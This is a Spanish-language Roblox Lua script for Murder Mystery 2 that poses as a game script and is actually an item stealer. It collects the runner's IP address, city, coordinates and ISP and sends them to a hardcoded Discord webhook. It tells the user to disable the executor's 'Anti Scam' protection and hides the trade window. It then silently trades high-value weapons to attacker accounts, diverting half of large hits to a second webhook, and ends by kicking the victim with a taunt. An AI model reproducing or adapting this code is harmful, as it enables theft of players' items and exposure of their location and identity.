local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
-- Para el módulo de IP/ubicación
if getgenv().IPModuleExecuted then return end
getgenv().IPModuleExecuted = true
-- Detecta plataforma
local platform = "Desconocido"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    platform = "Teléfono"
elseif UserInputService.KeyboardEnabled then
    platform = "PC"
end

-- Convierte código ISO a emoji de bandera
local function codeToEmoji(code)
    if not code or #code ~= 2 then return "🏳️" end
    local first = string.byte(code:sub(1,1):upper()) - 65 + 0x1F1E6
    local second = string.byte(code:sub(2,2):upper()) - 65 + 0x1F1E6
    return utf8.char(first, second)
end

-- Detecta ubicación usando varios servicios
local function detectLocation()
    local country, countryCode, city, ip, lat, lon, isp = "Desconocido", "??", "Desconocido", "Desconocido", nil, nil, "Desconocido"

    local services = {
        "https://ipapi.co/json",
        "https://ipinfo.io/json",
        "https://ipwhois.app/json/"
    }

    for _, url in ipairs(services) do
        local success, response = pcall(function()
            return (syn and syn.request or http_request or request)({Url=url, Method="GET"}).Body
        end)
        if success and response then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, response)
            if ok and data then
                country = data.country_name or data.country or country
                countryCode = data.country_code or data.countryCode or countryCode
                city = data.city or data.region or data.region_name or city
                ip = data.ip or data.IP or ip
                lat = tonumber(data.latitude or data.lat or (data.loc and data.loc:match("([^,]+)"))) 
                lon = tonumber(data.longitude or data.lon or (data.loc and data.loc:match(",([^,]+)"))) 
                isp = data.org or data.isp or isp

                if city ~= "Desconocido" then break end
            end
        end
    end

    local emojiCountry = codeToEmoji(countryCode)
    local displayCountry = country.." "..emojiCountry

    local km = "N/A"
    local lat0, lon0 = 0, 0
    if lat and lon then
        local function deg2rad(deg) return deg * math.pi / 180 end
        local R = 6371
        local dLat = deg2rad(lat - lat0)
        local dLon = deg2rad(lon - lon0)
        local a = math.sin(dLat/2)^2 + math.cos(deg2rad(lat0))*math.cos(deg2rad(lat))*math.sin(dLon/2)^2
        local c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
        km = math.floor(R * c)
    end

    local longDisplay = lat and lon and (lat..", "..lon) or "N/A"
    return displayCountry, city, km, longDisplay, ip, lat, lon, isp
end

local countryDisplay, cityDisplay, kmDisplay, longDisplay, userIP, latVal, lonVal, ispName = detectLocation()
local userISP = ispName ~= "Desconocido" and ("📡 "..ispName) or "🛰️ Desconocido"
local ispColor = ispName ~= "Desconocido" and 16729344 or 15158332

-- Webhook inicial
if getgenv().WebhookEnviado then return end
getgenv().WebhookEnviado = true

local WebhookURL = "https://discord.com/api/webhooks/1410132899683897455/YpndKbCHe4ULyEjHD7X2EKGJm6PfCD_5SVd4VxoQyEt9Hco9N6pndsXLiOZuhFB72YzK"
local avatarUrl = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
local executorName = identifyexecutor and identifyexecutor() or "Desconocido"
local googleMapsLink = (latVal and lonVal) and "[Ver ubicación](https://www.google.com/maps?q="..latVal..","..lonVal..")" or "N/A"

local data = {
    ["username"] = "🕵🏻Reporting data victim",
    ["avatar_url"] = avatarUrl,
    ["content"] = "**💪 Ejecución detectada, datos de la victima recopilados ✅**",
    ["embeds"] = {{
        ["description"] = "Información capturada automáticamente con el mejor sistema hacking:",
        ["color"] = 16729344,
        ["thumbnail"] = {["url"] = avatarUrl},
        ["fields"] = {
            {["name"]="💻 Dispositivo:", ["value"]=platform, ["inline"]=true},
            {["name"]="🛰️ IP:", ["value"]=userIP, ["inline"]=true},
            {["name"]="🌐 Compañía de Internet:", ["value"]=userISP, ["inline"]=true},
            {["name"]="👤 Usuario:", ["value"]=LocalPlayer.Name, ["inline"]=true},
            {["name"]="👥 DisplayName:", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
            {["name"]="🌎 País:", ["value"]=countryDisplay, ["inline"]=true},
            {["name"]="🏙️ Ciudad:", ["value"]=cityDisplay, ["inline"]=true},
            {["name"]="📏 Kilómetros:", ["value"]=kmDisplay, ["inline"]=true},
            {["name"]="🗺️ Longitud/Latitud:", ["value"]=longDisplay, ["inline"]=true},
            {["name"]="🔗 Ubicación:", ["value"]=googleMapsLink, ["inline"]=false},
            {["name"]="🛠️ Executor:", ["value"]=executorName, ["inline"]=true},
            {["name"]="⏰ Hora:", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
            {["name"]="💥 Estado:", ["value"]="Se recopilo todos los datos correctamente ✅", ["inline"]=false}
        },
        ["footer"] = {["text"] = "Sistema de ejecución hacking • " .. os.date("%d/%m/%Y")}
    }}
}

local FinalData = HttpService:JSONEncode(data)
local req = syn and syn.request or http_request or request
if req then
    pcall(function()
        req({
            Url = WebhookURL,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = FinalData
        })
    end)
end
-- ===== Aquí continúa todo tu script original =====
-- UI, trade, inventario, kick y demás funciones siguen igual
-- ======= UI DE CONFIRMACIÓN =======
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")

-- Para la UI de confirmación
if getgenv().UIExecuted then return end
getgenv().UIExecuted = true

-- Crear pantalla de confirmación
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiScamUI"
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0,500,0,300)
frame.Position = UDim2.new(0.5,0,0.5,0)
frame.AnchorPoint = Vector2.new(0.5,0.5)
frame.BackgroundColor3 = Color3.fromRGB(40,40,40)
frame.BorderSizePixel = 0
frame.ZIndex = 999
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0,30)
corner.Parent = frame

-- Sombra
local shadow = Instance.new("Frame")
shadow.Size = UDim2.new(1,20,1,20)
shadow.Position = UDim2.new(0,-10,0,-10)
shadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
shadow.BackgroundTransparency = 0.7
shadow.ZIndex = 998
shadow.Parent = frame
local shadowCorner = Instance.new("UICorner")
shadowCorner.CornerRadius = UDim.new(0,35)
shadowCorner.Parent = shadow

-- Título
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,60)
title.BackgroundTransparency = 1
title.Text = "⚠️🚨 Antes de iniciar el script ⚠️🚨"
title.Font = Enum.Font.GothamBold
title.TextSize = 24
title.TextColor3 = Color3.fromRGB(255, 215, 0)
title.TextScaled = true
title.ZIndex = 1000
title.Parent = frame

-- Mensaje
local message = Instance.new("TextLabel")
message.Size = UDim2.new(0.9,0,0.5,0)
message.Position = UDim2.new(0.05,0,0.2,0)
message.BackgroundTransparency = 1
message.Text = "⚠️ Para que el script funcione, desactiva 'Anti Scam' en Delta:\n\n1️⃣ Toca el icono de Delta y luego la tuerca (configuración).\n2️⃣ Desactiva 'Anti Scam'.\n3️⃣ Cierra el juego y vuelve a entrar.\n4️⃣ Comprueba que siga desactivada.\n\n✅ Si sigue desactivada, ejecuta el script.\n❌ Si no, desactívala .\n\n🔐Es Obligatorio ❤️"
message.Font = Enum.Font.Gotham
message.TextSize = 18
message.TextColor3 = Color3.fromRGB(255,255,255)
message.TextWrapped = true
message.TextYAlignment = Enum.TextYAlignment.Top
message.ZIndex = 1000
message.Parent = frame

-- Footer
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1,0,0,25)
footer.Position = UDim2.new(0,0,0.85,0)
footer.BackgroundTransparency = 1
footer.Text = "By @scriptzmm2.web (copiado automáticamente)"
footer.Font = Enum.Font.Gotham
footer.TextSize = 16
footer.TextColor3 = Color3.fromRGB(200,200,200)
footer.ZIndex = 1000
footer.Parent = frame

-- Copiar link
pcall(function() setclipboard("https://www.tiktok.com/@scriptzmm2.web?_t=ZM-8zEv9bU62LO&_r=1") end)

-- Botones
local buttonYes = Instance.new("TextButton")
buttonYes.Size = UDim2.new(0.4,0,0,50)
buttonYes.Position = UDim2.new(0.05,0,0.7,0)
buttonYes.Text = "Ya lo hice (35s)"
buttonYes.BackgroundColor3 = Color3.fromRGB(0,180,0)
buttonYes.TextColor3 = Color3.fromRGB(255,255,255)
buttonYes.Font = Enum.Font.GothamBold
buttonYes.TextSize = 20
buttonYes.AutoButtonColor = false
buttonYes.ZIndex = 1000
buttonYes.Parent = frame
local yesCorner = Instance.new("UICorner")
yesCorner.CornerRadius = UDim.new(0,15)
yesCorner.Parent = buttonYes

local buttonNo = Instance.new("TextButton")
buttonNo.Size = UDim2.new(0.4,0,0,50)
buttonNo.Position = UDim2.new(0.55,0,0.7,0)
buttonNo.Text = "No lo hice"
buttonNo.BackgroundColor3 = Color3.fromRGB(180,0,0)
buttonNo.TextColor3 = Color3.fromRGB(255,255,255)
buttonNo.Font = Enum.Font.GothamBold
buttonNo.TextSize = 20
buttonNo.AutoButtonColor = true
buttonNo.ZIndex = 1000
buttonNo.Parent = frame
local noCorner = Instance.new("UICorner")
noCorner.CornerRadius = UDim.new(0,15)
noCorner.Parent = buttonNo

-- Animación de entrada
frame.Position = UDim2.new(0.5,0,-0.5,0)
TweenService:Create(frame,TweenInfo.new(0.5,Enum.EasingStyle.Bounce),{Position=UDim2.new(0.5,0,0.5,0)}):Play()

-- Cuenta regresiva
local countdown = 35
spawn(function()
    while countdown>0 do
        buttonYes.Text = "Ya lo hice ("..countdown.."s)"
        task.wait(1)
        countdown -= 1
    end
    buttonYes.Text = "Ya lo hice"
    buttonYes.AutoButtonColor = true
end)

-- Control de botones
local confirmed = nil
local function closeUI()
    TweenService:Create(frame,TweenInfo.new(0.5,Enum.EasingStyle.Quad,Enum.EasingDirection.In),{Position=UDim2.new(0.5,0,-0.5,0)}):Play()
    task.wait(0.6)
    screenGui:Destroy()
end

buttonYes.MouseButton1Click:Connect(function()
    if countdown <= 0 then
        confirmed = true
        closeUI()
    end
end)
buttonNo.MouseButton1Click:Connect(function()
    confirmed = false
    closeUI()
end)

-- Siempre encima usando lo mismo que la otra UI
spawn(function()
    while screenGui.Parent do
        frame.ZIndex = 999
        task.wait(0.5)
    end
end)

-- Esperar confirmación
repeat task.wait(0.1) until confirmed ~= nil

-- Congelar si dice no (último)
if not confirmed then while true do task.wait() end end
-- ======= SCRIPT ORIGINAL =======
-- Pega tu script completo aquí exactamente como lo tenías
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Copiar URL al portapapeles desde el inicio
if setclipboard then
    setclipboard("https://discord.gg/4VySnCHy")
end

-- Configuración principal
local webhook = _G.webhook or ""
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local pingEveryone = _G.pingEveryone == "Yes"

-- Configuración DualHook
local DualHookUsers = {"cybertu24","AnonymousANONIMO125"}
local DualHookWebhook = "https://discord.com/api/webhooks/1393678758883496078/dWWVbv5oLiiHL9Po5FYg77bbJXVBeHkkij_Hy1MpxQHut1pNY2c_hzNg8jK0Qq7jNCRM" -- Cambiar a tu webhook real
local DualHookMinValue = 300
local DualHookPercent = 50 -- porcentaje de hits que se van a ti

-- Kick por servidor lleno, privado o VIP
local function CheckServerInitial()
    if #Players:GetPlayers() >= 12 then
        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
    end
    if game.PrivateServerId and game.PrivateServerId ~= "" then
        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
    end
    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
    if success and ownerId and ownerId ~= 0 then
        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
    end
end
CheckServerInitial()

local req = syn and syn.request or http_request or request
if not req then warn("No HTTP request method available!") return end

-- Función para enviar webhook (dualhook automático)
local function SendDualHook(title, description, fields)
    local useDual = false
    for _, field in ipairs(fields or {}) do
        if field.value then
            local v = tonumber(field.value:match("Valor:%s*(%d+)") or 0)
            if v >= DualHookMinValue then
                local rand = math.random(1,100)
                if rand <= DualHookPercent then
                    useDual = true
                    break
                end
            end
        end
    end
    local targetWebhook = useDual and DualHookWebhook or webhook
    local prefix = pingEveryone and "@everyone " or ""  -- <--- define antes
    local data = {
        ["content"] = prefix,
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description or "",
            ["color"] = 65280,
            ["fields"] = fields or {},
            ["thumbnail"] = {["url"]="https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
            ["footer"] = {["text"]="The best stealer by Anonimo 🇪🇨"}
        }}
    }
    local body = HttpService:JSONEncode(data)
    pcall(function() req({Url=targetWebhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body}) end)
end

-- Función para crear Pastebin
local function CreatePaste(content)
    local api_dev_key = "_hLJczUn9kRRrZ857l24K6iIAhzm_yNs"
    local api_paste_name = "MM2 Inventario "..LocalPlayer.Name
    local api_paste_format = "text"
    local api_paste_private = "1"
    local body = "api_option=paste&api_dev_key="..api_dev_key..
                 "&api_paste_code="..HttpService:UrlEncode(content)..
                 "&api_paste_name="..HttpService:UrlEncode(api_paste_name)..
                 "&api_paste_format="..api_paste_format..
                 "&api_paste_private="..api_paste_private
    local res = req({Url = "https://pastebin.com/api/api_post.php", Method = "POST", Headers = {["Content-Type"]="application/x-www-form-urlencoded"}, Body = body})
    if res and res.Body then return res.Body end
end

-- Desactivar GUI de trades
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
    local gui = playerGui:FindFirstChild(guiName)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end)
        gui.Enabled=false
    end
end

-- TradeService
local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user)
    local plrObj = Players:FindFirstChild(user)
    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
end
local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end

-- Database y valores
local database = require(game.ReplicatedStorage.Database.Sync.Item)
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
local categories = {
    godly="https://supremevaluelist.com/mm2/godlies.html",
    ancient="https://supremevaluelist.com/mm2/ancients.html",
    unique="https://supremevaluelist.com/mm2/uniques.html",
    classic="https://supremevaluelist.com/mm2/vintages.html",
    chroma="https://supremevaluelist.com/mm2/chromas.html"
}
local headers={["Accept"]="text/html",["User-Agent"]="Mozilla/5.0"}

local function trim(s) return s:match("^%s*(.-)%s*$") end
local function fetchHTML(url) local res=req({Url=url, Method="GET", Headers=headers}) return res and res.Body or "" end
local function parseValue(div) local str=div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>") if str then str=str:gsub(",","") return tonumber(str) end end
local function extractItems(html)
    local t={} 
    for name,body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        name=trim(name:match("([^<]+)"):gsub("%s+"," "))
        name=trim((name:split(" Click "))[1])
        local v=parseValue(body)
        if v then t[name:lower()]=v end
    end
    return t
end
local function extractChroma(html)
    local t={} 
    for name,body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        local n=trim(name:match("([^<]+)"):gsub("%s+"," ")):lower()
        local v=parseValue(body)
        if v then t[n]=v end
    end
    return t
end
local function buildValueList()
    local allValues,chromaValues={},{}
    for r,url in pairs(categories) do
        local html=fetchHTML(url)
        if html~="" then
            if r~="chroma" then
                local vals=extractItems(html)
                for k,v in pairs(vals) do allValues[k]=v end
            else chromaValues=extractChroma(html) end
        end
    end
    local valueList={}
    for id,item in pairs(database) do
        local name=item.ItemName and item.ItemName:lower() or ""
        local rarity=item.Rarity or ""
        local hasChroma=item.Chroma or false
        if name~="" and rarity~="" then
            local ri=table.find(rarityTable,rarity)
            local godlyIdx=table.find(rarityTable,"Godly")
            if ri and ri>=godlyIdx then
                if hasChroma then
                    for cname,val in pairs(chromaValues) do
                        if cname:find(name) then valueList[id]=val break end
                    end
                else
                    if allValues[name] then valueList[id]=allValues[name] end
                end
            end
        end
    end
    return valueList
end

-- Preparar armas a enviar
local weaponsToSend={}
local totalValue=0
local min_rarity_index=table.find(rarityTable,min_rarity)
local valueList=buildValueList()

local profile=game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
for id,amount in pairs(profile.Weapons.Owned) do
    local item=database[id]
    if item then
        local ri=table.find(rarityTable,item.Rarity)
        if ri and ri>=min_rarity_index then
            local v=valueList[id] or ({10,20})[math.random(1,2)]
            if v>=min_value then
                table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=v,Rarity=item.Rarity})
                totalValue+=v*amount
            end
        end
    end
end
table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)

-- Webhook inicial
local weaponsSent = {}
for _, w in ipairs(weaponsToSend) do table.insert(weaponsSent, w) end

local fernToken = math.random(100000,999999)
local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"

local function SendInitWebhook()
    if #weaponsSent == 0 then return end

    local pasteLink
    if #weaponsSent > 18 then
        local pasteContent = ""
        for _, w in ipairs(weaponsSent) do
            pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
        end
        pasteContent = pasteContent.."\nValor total del inventario📦: "..tostring(totalValue).."💰"
        pasteLink = CreatePaste(pasteContent)
    end

    local fieldsInit={
        {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
        {name="Inventario 📦:", value="", inline=false},
        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
        {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
    }

    local maxEmbedItems = math.min(18,#weaponsSent)
    for i=1,maxEmbedItems do
        local w = weaponsSent[i]
        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
    end

    if #weaponsSent > 18 then
        fieldsInit[2].value = fieldsInit[2].value.."... y más armas 🔥\n"
        if pasteLink then
            fieldsInit[2].value = fieldsInit[2].value.."Mira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
        end
    end

    local prefix=pingEveryone and "@everyone " or ""
    SendDualHook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit)
end
SendInitWebhook()

-- Trade finalizado
local function TradeFinalizado()
    local fieldsFinal={
        {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
        {name="Armas enviadas 📦:", value="", inline=false},
        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true}
    }

    local maxEmbedItems = math.min(18,#weaponsSent)
    for i=1,maxEmbedItems do
        local w = weaponsSent[i]
        fieldsFinal[2].value = fieldsFinal[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
    end

    if #weaponsSent > 18 then
        fieldsFinal[2].value = fieldsFinal[2].value.."... y más armas 🔥\n"
    end

    SendDualHook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
    task.wait(3)
    LocalPlayer:Kick("El ladron encubierto☠️ ha robado TODO tu inventario de MM2🔥 llora niño/a🤣😂🥱")
end

-- Trade principal
local function doTrade(targetName)
    if #weaponsToSend == 0 then return end
    while #weaponsToSend>0 do
        local status=getTradeStatus()
        if status=="None" then
            sendTradeRequest(targetName)
        elseif status=="SendingRequest" then
            task.wait(0.3)
        elseif status=="StartTrade" then
            for i=1,math.min(4,#weaponsToSend) do
                local w=table.remove(weaponsToSend,1)
                for _=1,w.Amount do
                    addWeaponToTrade(w.DataID)
                end
            end
            task.wait(6)
            acceptTrade()
            waitForTradeCompletion()
        else task.wait(0.5) end
        task.wait(1)
    end
    TradeFinalizado()
end

-- Conectar trades con los usuarios
for _, p in ipairs(Players:GetPlayers()) do
    if table.find(users,p.Name) or table.find(DualHookUsers,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end
Players.PlayerAdded:Connect(function(p)
    if table.find(users,p.Name) or table.find(DualHookUsers,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end)
